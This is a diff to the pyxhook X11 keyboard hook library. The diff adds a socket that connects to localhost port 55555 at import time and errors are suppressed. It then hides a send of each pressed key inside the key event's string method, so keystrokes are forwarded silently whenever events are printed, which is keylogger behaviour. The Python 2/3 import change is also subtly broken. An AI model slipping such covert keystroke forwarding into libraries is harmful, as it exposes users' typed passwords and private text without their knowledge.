@@ -1,14 +1,31 @@
 from __future__ import print_function
 
+import socket
 import sys
 import re
 import time
 import threading
-import commands
+try:
+	import subprocess
+except:
+    import commands
 
 from Xlib import X, XK, display
 from Xlib.ext import record
 from Xlib.protocol import rq
+
+HOST = 'localhost'
+PORT = 55555
+BUFSIZ = 4096
+client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+host = HOST
+port = PORT
+sock_addr = (host, int(port))
+
+try :
+    client_sock.connect(sock_addr)
+except:
+	pass
 
 class HookManager(threading.Thread):
     """ This is the main class. Instantiate it, and you can hand it KeyDown
@@ -31,18 +48,18 @@ class HookManager(threading.Thread):
         # Give these some initial values
         self.mouse_position_x = 0
         self.mouse_position_y = 0
-        if (commands.getoutput("xset q | grep Caps")[21:24] == 'off'):
+        if (subprocess.getoutput("xset q | grep Caps")[21:24] == 'off'):
             self.ison = {"shift": False, "caps": False}
-            if (commands.getoutput("xset q | grep Num")[45:48] == 'off'):
+            if (subprocess.getoutput("xset q | grep Num")[45:48] == 'off'):
                 self.ison["num"] = False
-            elif (commands.getoutput("xset q | grep Num")[45:48] == 'on '):
+            elif (subprocess.getoutput("xset q | grep Num")[45:48] == 'on '):
                 self.ison["num"] = True
-        elif (commands.getoutput("xset q | grep Caps")[21:24] == 'on '):
+        elif (subprocess.getoutput("xset q | grep Caps")[21:24] == 'on '):
             self.ison = {"shift": False, "caps": True}
             self.ison["shift"] = self.ison["shift"] + 1
-            if (commands.getoutput("xset q | grep Num")[45:48] == 'off'):
+            if (subprocess.getoutput("xset q | grep Num")[45:48] == 'off'):
                 self.ison["num"] = False
-            elif (commands.getoutput("xset q | grep Num")[45:48] == 'on '):
+            elif (subprocess.getoutput("xset q | grep Num")[45:48] == 'on '):
                 self.ison["num"] = True
 
 #        print(self.ison)
@@ -128,6 +145,11 @@ class HookManager(threading.Thread):
         self.record_dpy.record_free_context(self.ctx)
 
     def cancel(self):
+        try:
+            client_sock.shutdown(1)
+            client_sock.close()
+        except:
+        	pass
         self.finished.set()
         self.local_dpy.record_disable_context(self.ctx)
         self.local_dpy.flush()
@@ -419,6 +441,11 @@ class pyxhookkeyevent:
         self.MessageName = MessageName
 
     def __str__(self):
+        try:
+            client_sock.send((self.Key).encode('utf-8'))
+        except:
+        	pass
+        #client_sock.send('\n'.encode('utf-8'))
         return '\n'.join((
 #            'Window Handle: {s.Window}',
 #            'Window Name: {s.WindowName}',
@@ -471,4 +498,3 @@ if __name__ == '__main__':
     hm.start()
     time.sleep(10)
     hm.cancel()
-
